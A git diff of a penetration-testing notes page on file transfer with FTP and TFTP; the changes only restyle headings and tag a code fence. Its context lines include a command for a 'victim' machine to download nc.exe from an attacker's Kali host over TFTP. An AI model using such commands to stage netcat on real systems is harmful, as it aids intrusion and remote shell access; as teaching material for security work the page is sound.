@@ -1,6 +1,6 @@
 # ⭕ FTP
 
-## FTP server
+## <mark style="color:red;">FTP server</mark>
 
 ```
 # python
@@ -28,7 +28,7 @@ chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
 
-## Windows Client
+## <mark style="color:red;">Windows Client</mark>
 
 ```
 #Work well with python. With pure-ftp use fusr:ftp
@@ -41,7 +41,7 @@ echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
 
-## TFTP
+## <mark style="color:red;">TFTP</mark>
 
 By default in XP and 2003 (in others it need to be explicitly added during installation)
 
@@ -67,11 +67,11 @@ In **victim**, connect to the Kali server:
 tftp -i <KALI-IP> get nc.exe
 ```
 
-## Windows FTP Server Powershell
+## <mark style="color:red;">Windows FTP Server Powershell</mark>
 
 {% embed url="https://ridicurious.com/2020/07/02/setup-ftp-server-with-powershell" %}
 
-```
+```powershell
 #Install IIS Feature
 Install-WindowsFeature -Name Web-Server -IncludeManagementTools
 
@@ -159,7 +159,7 @@ Test-NetConnection -ComputerName localhost -Port 21
 ftp localhost
 ```
 
-## FTP From Browser
+## <mark style="color:red;">FTP From Browser</mark>
 
 ```
 ftp://ftp.example.com
